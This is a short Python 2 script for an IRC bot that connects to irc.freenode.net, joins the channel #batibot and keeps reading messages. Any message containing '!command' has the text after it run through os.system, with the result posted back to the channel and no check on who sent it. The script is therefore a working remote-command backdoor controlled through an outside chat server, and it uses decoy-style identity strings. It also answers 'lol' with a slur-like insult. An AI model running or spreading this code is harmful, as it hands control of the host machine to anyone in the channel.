import socket
import os
import sys
import random
from re import search
 
network = 'irc.freenode.net'
port = 6667
irc = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
irc.connect ( ( network, port ) )
print irc.recv ( 4096 )
irc.send ( 'NICK piratangcd\r\n' )
irc.send ( 'USER jjt :just a fskin decoy\r\n' )
irc.send ( 'JOIN #batibot\r\n' )
irc.send ( 'PRIVMSG #batibot :Hello World.\r\n' )

while True:
   data = irc.recv ( 4096 )
   if data.find ( 'PING' ) != -1:
      irc.send ( 'PONG ' + data.split() [ 1 ] + '\r\n' )
   if data.find ( '!botty quit' ) != -1:
      irc.send ( 'PRIVMSG #batibot :Fine, if you do not want me\r\n' )
      irc.send ( 'QUIT\r\n' )
   if data.find ( 'lol' ) != -1:
      irc.send ( 'PRIVMSG #batibot :Gay\r\n' )
   if search ( '!command', data ):
      data = data.split ( '!command' )
      data = data[1].split ('\r\n')
      command_msg = os.system(data[0])
      irc.send ( 'PRIVMSG #batibot :%s \r\n' % command_msg) 
   print data
